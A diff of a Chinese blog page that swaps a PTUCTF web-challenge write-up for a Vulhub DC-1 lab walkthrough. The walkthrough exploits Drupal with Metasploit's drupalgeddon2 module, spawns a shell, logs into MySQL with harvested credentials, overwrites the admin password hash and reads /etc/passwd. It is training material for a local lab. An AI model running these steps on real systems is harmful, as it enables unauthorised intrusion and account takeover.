@@ -6,79 +6,45 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>PTUCTF_WEB_Write Up | MiGooli&#39;s Blog</title>
+  <title>Vulhub_DC-1 | MiGooli&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="整理一下平台上现存的WEB题的做法，包括练习题和比赛题，希望大家能够理解题目，不要照抄答案">
+  <meta name="description" content="参加过红队再来打Vulhub，感触颇深，也对渗透的理解更加深刻">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PTUCTF_WEB_Write Up">
-<meta property="og:url" content="http://example.com/2021/11/29/PTUCTF_WEB_Write%20Up/index.html">
+<meta property="og:title" content="Vulhub_DC-1">
+<meta property="og:url" content="http://example.com/2022/08/17/Vulhub_DC-1/index.html">
 <meta property="og:site_name" content="MiGooli&#39;s Blog">
-<meta property="og:description" content="整理一下平台上现存的WEB题的做法，包括练习题和比赛题，希望大家能够理解题目，不要照抄答案">
+<meta property="og:description" content="参加过红队再来打Vulhub，感触颇深，也对渗透的理解更加深刻">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/70a886b905d64909b6c7789ea1cb6dbf.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/81f252e50eda40c8a8f18bd2060b2e22.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/ad988fa0387b4d708a9f80403e4eb609.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/611562ff4a32445a9d24fc975198f376.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b058e5f41e3847e4bdffe96e029d4966.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/dbdd1c4933634eb38d21380d26aa6f3b.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/1ed37ac65485427e9ee3193c96c98650.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/311347e30a024d6695443475912f2cd5.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/9b08aa7e4db244e4beaf4f4773d98efb.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/5ec5afaca6b14890ba70c3ca88292170.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/752b0bacaa0146d583a9ff6e020af120.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/3d5367ba47644b9996b0ef073d470e3e.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/3f6e7c41a8af46f38f4eb15b1f852c6f.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c24a066f85da44dfb2768b9ae0970e4f.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b29994fecf8c4733b750529ce01a7f15.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/17c61f1c601f44c381244008086d6188.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c703674c26c64909959f324ab90afea4.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/3a5fe491545d48f6b08646d7db7656dd.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/92c7e56557b944219642a2275540e874.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d61d48dbe01d48a8af90a19364e39039.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/92f96376ba25497ca069615e4e471958.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/330f77d6ef794992b0dd6157dd6971d4.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/dd120b2bde664d27881089554b39faf2.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/39043382239943a892eb6e45975d3b41.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/4fc1df8d03484a54a85d3543f46719e6.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/5d5b2dfff8c6405aa56796a7a6aeb0f7.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/62ea1a86e7a44997b4001e20a8b61185.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/81c002efa0034dfd9c3e349e59cd0a8c.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/5572b587e8a947cab8191ab026b1fdb8.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/aebcb85915104d8dbeec6137f90048a1.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d9b5f934c7a84fd18b41e9b788e37343.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/a9fc76cc9c5b4669a4f5a718564f2d9e.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/03d9b22bd0f54481a652f4436670b8de.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/4a177e5942ba4c318f72482b7ad63491.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/a0814a0ed358434aa51c52d3261eee63.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/4184ed75bce04fbb864c81bdc1784cc9.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/411a76f2e1b04b3aa78378f9fc2badc9.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/283651d8d0f4465ab9a1d054d56ec832.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d86b5d45d21641e48724b17117f01367.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c09e7e86084d48b186d82dfeac29ae2c.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/a73f43fe8396425ebc17b95b6b26c39a.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/8d6d77b2569940ba9d42d3c0ac000d67.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/6c995b9d651244fea2e8fc1700c42ffc.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/3ba081118a6a470fbf079113f8eaae76.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/756384e9885f465ea9fe436ec13e2ee8.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/bb012c943cfb44a7858f42893dd41633.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/91e0190587ab4050b95f6688ae990217.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/9dc9297bd34d4325b316a017a4defdd9.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/98b8b9f78ad348b6a584cc5647a09a44.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c4f8df186ed24b7699de516f5e231f15.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/d42b2a15d4274014b1f96aff2c8a60d2.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e05783f11cf44761a6c746cc44519fb1.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/a2a7c60a4d4444ec8467e9dff4a4b86c.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/53fd769f1e6c40a88cfa96586272b342.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/7e1b9dabf2fd45fd81943c9e4d998aee.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/c58818f13c1f41eab983c229fd0be3c4.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/946c5f28827944feaa75bc8062e3b0d3.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/23f7cabcac534990b764dc0aec0ddeba.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/83a425d24b32438e84d072351dab7df9.png">
-<meta property="article:published_time" content="2021-11-28T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-06-25T16:35:01.576Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c67d0b76227845ce9340a2c83590fb00.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/daf35e2ae88d449790806ff31fee251a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/968bfb066eec4462b40575f0bb4f161a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ba5b07c870af46d0baa75901824e4e93.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4da2c57237eb4876a5135b860adb40bc.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c1c197e12de54c27a10b82781414ed12.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ff153198ccc8450588055f2fbc440b8b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9030f9f7f4814aabaf52dbe1ac7b466c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7d17b61fdef642d8aca5cf6f7e3cccce.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ea623b3abe1545db8552dedf300ecf1c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8800cc7ba9fb479390792806895082c5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/56524d2de8f64a59aae625e2d8489a69.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c3d9ab81021a45139ed999ab1b200a62.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/05a4ceb749f1419fbd8dc6a474cb9553.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/da2398b2956849cbb5646fe18792b5e5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/59520acbe0ba426bb7eab09f2af323e3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/13e6a8998ada41178f629b6d03bccd6d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a99dbc5aca30460d8ac83fae82fc8506.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/35349c79353a47b58319b2930b40e1c5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/bc7554dd8e974b15bf4ff7733d085d8f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0046cbf9cebc45e59292a26d2357b58f.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/27d74dcb82e74715b3864876271e9ac9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c643db417b1742dc89a19c5b6cfa4bc7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/61dd94fbca774e3da45f9a6722f47471.png">
+<meta property="article:published_time" content="2022-08-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-08-17T10:01:52.206Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/70a886b905d64909b6c7789ea1cb6dbf.png">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/c67d0b76227845ce9340a2c83590fb00.png">
   
     <link rel="alternative" href="/atom.xml" title="MiGooli&#39;s Blog" type="application/atom+xml">
   
@@ -226,118 +192,110 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-PTUCTF_WEB_Write Up" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Vulhub_DC-1" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      PTUCTF_WEB_Write Up
+      Vulhub_DC-1
     </h1>
   
 
         
-        <a href="/2021/11/29/PTUCTF_WEB_Write%20Up/" class="archive-article-date">
-  	<time datetime="2021-11-28T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-29</time>
+        <a href="/2022/08/17/Vulhub_DC-1/" class="archive-article-date">
+  	<time datetime="2022-08-16T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-17</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>整理一下平台上现存的WEB题的做法，包括练习题和比赛题，希望大家能够理解题目，不要照抄答案<br><span id="more"></span></p>
-<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p><img src="https://img-blog.csdnimg.cn/70a886b905d64909b6c7789ea1cb6dbf.png" alt="在这里插入图片描述"><br>直接查看源码就能获得flag<br><img src="https://img-blog.csdnimg.cn/81f252e50eda40c8a8f18bd2060b2e22.png" alt="在这里插入图片描述"></p>
+        <p>参加过红队再来打Vulhub，感触颇深，也对渗透的理解更加深刻</p>
+<span id="more"></span>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="扫描靶机IP"><a href="#扫描靶机IP" class="headerlink" title="扫描靶机IP"></a>扫描靶机IP</h2><p>由于我的DC-1靶机是在本地上的，所以只需要扫描攻击机kali的网段即可找到DC-1靶机的IP</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.80.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/c67d0b76227845ce9340a2c83590fb00.png" alt="在这里插入图片描述"></p>
+<p>经过排查，发现<strong>192.168.80.134</strong>为靶机IP</p>
+<h2 id="扫描靶机目录"><a href="#扫描靶机目录" class="headerlink" title="扫描靶机目录"></a>扫描靶机目录</h2><p>访问靶机IP，发现是一个Drupal 7网站，先扫一遍目录，发现了readme.txt和robots.txt，但是没有什么特别有价值的信息</p>
+<h1 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h1><h2 id="利用CVE"><a href="#利用CVE" class="headerlink" title="利用CVE"></a>利用CVE</h2><p>搜索了很多Drupal 7的CVE，但是基本上都要后台管理员权限，不然就是条件太苛刻，遂放弃</p>
+<h2 id="利用MSF"><a href="#利用MSF" class="headerlink" title="利用MSF"></a>利用MSF</h2><h3 id="搜索exp"><a href="#搜索exp" class="headerlink" title="搜索exp"></a>搜索exp</h3><p>祭出大杀器msf，搜索Durpal相关exp，发现unix/webapp/drupal_drupalgeddon2是我们想要的</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/daf35e2ae88d449790806ff31fee251a.png" alt="\[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-7iTeGOyr-1660730098225)(C:\MiGooli\HexoBlog\source\_posts\Vulhub_DC-1.assets\image-20220817170244347.png)\]"></p>
+<h3 id="设置IP"><a href="#设置IP" class="headerlink" title="设置IP"></a>设置IP</h3><p>选择使用该exp，查看设置项，发现只需设置靶机IP即可</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOST <span class="string">&quot;192.168.80.134&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/968bfb066eec4462b40575f0bb4f161a.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/ba5b07c870af46d0baa75901824e4e93.png" alt="在这里插入图片描述"></p>
+<h3 id="启动exp"><a href="#启动exp" class="headerlink" title="启动exp"></a>启动exp</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/4da2c57237eb4876a5135b860adb40bc.png" alt="在这里插入图片描述"></p>
+<h3 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/c1c197e12de54c27a10b82781414ed12.png" alt="在这里插入图片描述"></p>
+<h3 id="获得交互式shell"><a href="#获得交互式shell" class="headerlink" title="获得交互式shell"></a>获得交互式shell</h3><p>用msf直接获得的shell有点垃圾，所以利用python获得交互式shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import pty;pty.spawn(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/ff153198ccc8450588055f2fbc440b8b.png" alt="在这里插入图片描述"></p>
+<h3 id="获得flag1"><a href="#获得flag1" class="headerlink" title="获得flag1"></a>获得flag1</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/9030f9f7f4814aabaf52dbe1ac7b466c.png" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Every good CMS needs a config file - and so do you.</span><br></pre></td></tr></table></figure>
+<h3 id="获得flag2"><a href="#获得flag2" class="headerlink" title="获得flag2"></a>获得flag2</h3><p>根据flag1的提示，寻找Durpal的配置文件（settings.php）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name <span class="string">&quot;settings.php&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/7d17b61fdef642d8aca5cf6f7e3cccce.png" alt="在这里插入图片描述"></p>
+<p>读取settings.php文件，获得flag2和下一个flag的提示</p>
+<p><img src="https://img-blog.csdnimg.cn/ea623b3abe1545db8552dedf300ecf1c.png" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>查看源码的方法</p>
-<p>​    1.F12</p>
-<p>​    2.CTRL + U</p>
-<p>​    3.右键 -&gt; 查看网页源代码</p>
-<p>​    4.URL前面加view-source:</p>
+<p>Brute force and dictionary attacks aren’t the</p>
+<p>only ways to gain access (and you WILL need access).</p>
+<p>What can you do with these credentials?</p>
 </blockquote>
-<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p><img src="https://img-blog.csdnimg.cn/ad988fa0387b4d708a9f80403e4eb609.png" alt="在这里插入图片描述"><br>1.访问/robots.txt，得到关键信息<br><img src="https://img-blog.csdnimg.cn/611562ff4a32445a9d24fc975198f376.png" alt="在这里插入图片描述"><br>2.然后访问flllllaaaaagggg，得到flag</p>
-<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><img src="https://img-blog.csdnimg.cn/b058e5f41e3847e4bdffe96e029d4966.png" alt="在这里插入图片描述"><br>根据提示，查看cookie，得到flag<br>[*] 这里要注意的是，cookie中的信息被URL编码过，所以需要先URL解码才能得到正确的flag！<br><img src="https://img-blog.csdnimg.cn/dbdd1c4933634eb38d21380d26aa6f3b.png" alt="在这里插入图片描述"></p>
-<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p><img src="https://img-blog.csdnimg.cn/1ed37ac65485427e9ee3193c96c98650.png" alt="在这里插入图片描述"><br>根据提示，查看协议头信息，得到flag<br><img src="https://img-blog.csdnimg.cn/311347e30a024d6695443475912f2cd5.png" alt="在这里插入图片描述"></p>
+<h3 id="获得flag3"><a href="#获得flag3" class="headerlink" title="获得flag3"></a>获得flag3</h3><p>根据flag2的提示，通过访问权限来进行下一步工作，settings.php中又有数据库配置信息，登录mysql寻找信息</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/8800cc7ba9fb479390792806895082c5.png" alt="在这里插入图片描述"></p>
+<p>成功登录mysql后开始翻数据库中的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use drupaldb;</span><br><span class="line">show tables;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+<p>在users表中发现了admin的密码，但是是被加密过的，尝试破解</p>
+<p><img src="https://img-blog.csdnimg.cn/56524d2de8f64a59aae625e2d8489a69.png" alt="在这里插入图片描述"></p>
+<p>hashcat爆破无果，尝试直接修改密码，但是不能用修改后的明文密码直接登录，猜测需要用同款加密密文才行</p>
+<p><img src="https://img-blog.csdnimg.cn/c3d9ab81021a45139ed999ab1b200a62.png" alt="在这里插入图片描述"></p>
+<p>通过百度找到Drupal自带的加密工具，生成hash</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh migooli</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/05a4ceb749f1419fbd8dc6a474cb9553.png" alt="在这里插入图片描述"></p>
+<p>登录mysql，修改admin密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&quot;$S$DAnPmd39q72Pd53ZitES/hatWzb/I5nE7Ckx74s7nE7WpgYFWxta&quot; where name=&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/da2398b2956849cbb5646fe18792b5e5.png" alt="在这里插入图片描述"></p>
+<p>使用修改后的密码登录网站，在content处找到flag3</p>
+<p><img src="https://img-blog.csdnimg.cn/59520acbe0ba426bb7eab09f2af323e3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/13e6a8998ada41178f629b6d03bccd6d.png" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>这题直接在浏览器中查看network的信息也可以，但是做web题还是养成用burp抓包的好习惯</p>
+<p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
 </blockquote>
-<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p><img src="https://img-blog.csdnimg.cn/9b08aa7e4db244e4beaf4f4773d98efb.png" alt="在这里插入图片描述"><br>直接访问/index.phps下载源码，然后在下载的源码中拿到flag<br><img src="https://img-blog.csdnimg.cn/5ec5afaca6b14890ba70c3ca88292170.png" alt="在这里插入图片描述"></p>
-<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p><img src="https://img-blog.csdnimg.cn/752b0bacaa0146d583a9ff6e020af120.png" alt="在这里插入图片描述"><br>考察弱密码爆破，这边使用的是burp中的Intruder模块，具体步骤如下：<br>第一步：抓包<br>第二步：发包到Intruder<br><img src="https://img-blog.csdnimg.cn/3d5367ba47644b9996b0ef073d470e3e.png" alt="在这里插入图片描述"><br>第三步：清除爆破点<br><img src="https://img-blog.csdnimg.cn/3f6e7c41a8af46f38f4eb15b1f852c6f.png" alt="在这里插入图片描述"><br>第四步：添加爆破点<br><img src="https://img-blog.csdnimg.cn/c24a066f85da44dfb2768b9ae0970e4f.png" alt="在这里插入图片描述"></p>
-<p>第五步：加载字典<br><img src="https://img-blog.csdnimg.cn/b29994fecf8c4733b750529ce01a7f15.png" alt="在这里插入图片描述"><br>第六步：开始爆破<br><img src="https://img-blog.csdnimg.cn/17c61f1c601f44c381244008086d6188.png" alt="在这里插入图片描述"><br>爆破完成后，点击Length查看返回长度和别人不一样的密码，在Response中查看返回的结果<br><img src="https://img-blog.csdnimg.cn/c703674c26c64909959f324ab90afea4.png" alt="在这里插入图片描述"></p>
-<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><p><img src="https://img-blog.csdnimg.cn/3a5fe491545d48f6b08646d7db7656dd.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/92c7e56557b944219642a2275540e874.png" alt="在这里插入图片描述"><br>首先是GET传参，GET传参就是在URL后面加上”?变量名=变量值”<br><img src="https://img-blog.csdnimg.cn/d61d48dbe01d48a8af90a19364e39039.png" alt="在这里插入图片描述"><br>接下来是POST传参，POST传参需要用HackBar或者其他工具进行传参<br><img src="https://img-blog.csdnimg.cn/92f96376ba25497ca069615e4e471958.png" alt="在这里插入图片描述"></p>
-<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p><img src="https://img-blog.csdnimg.cn/330f77d6ef794992b0dd6157dd6971d4.png" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="number">0</span> &amp;&amp; <span class="variable">$a</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(is_numeric(<span class="variable">$b</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;the b can not be a number!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$b</span> &gt; <span class="number">666</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NoNoNo,try another way&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You must set the a and the b!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>考察PHP特性，代码的大概逻辑就是先GET传参a和b，且a和b的值不能为空；当a等于0且a不为空的时候，得到第一部分flag；当b不是数字且b大于666的时候，得到第二部分flag<br>代码的逻辑看起来似乎很矛盾，这里面就涉及到php一些特性和函数漏洞<br>首先是a的值为0且不为空，这里我们仔细观察可以发现，这边的比较是两个等号；在PHP中，两个等号是弱类型比较，也就是只比较变量值，不比较变量类型，换句话说，字符’0’和数字0是相等的，而且字符类型不算作空值，所以这里令a=’0’就能得到第一部分flag<br><img src="https://img-blog.csdnimg.cn/dd120b2bde664d27881089554b39faf2.png" alt="在这里插入图片描述"><br>接着我们来看b，b不能为数字并且b的值要大于666才能得到第二部分flag；这里根据is_numeric()函数的特性，我们可以用数字字符串来绕过这个函数，什么意思呢，就是我们令b=6666a，这时候的b是一个字符串，所以is_numeric()就不成立，我们就可以进入下一条语句，又因为在PHP中数字字符串和数字进行比较的时候，只比较数字字符串中的数字部分，也就是说b=6666a和666进行比较的时候，实际上只拿6666和666进行比较，所以可以成功拿到第二部分flag<br><img src="https://img-blog.csdnimg.cn/39043382239943a892eb6e45975d3b41.png" alt="在这里插入图片描述"></p>
-<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p><img src="https://img-blog.csdnimg.cn/4fc1df8d03484a54a85d3543f46719e6.png" alt="在这里插入图片描述"><br>考察linux命令的使用，这边给出常用的命令</p>
+<h3 id="获得flag4"><a href="#获得flag4" class="headerlink" title="获得flag4"></a>获得flag4</h3><p>根据flag3的提示，查看/etc/passwd，发现有个叫flag4的用户和目录</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/a99dbc5aca30460d8ac83fae82fc8506.png" alt="在这里插入图片描述"></p>
+<p>进入/home/flag4，拿到flag4</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/flag4</span><br><span class="line">ls</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/35349c79353a47b58319b2930b40e1c5.png" alt="在这里插入图片描述"></p>
 <blockquote>
-<p>ls：列出当前目录所有文件<br>ls /：列出根目录所有文件<br>cat 1.txt：读取文件1.txt的内容<br>cd ..：返回上一级目录<br>cd /var/www/html/：进入/var/www/html目录</p>
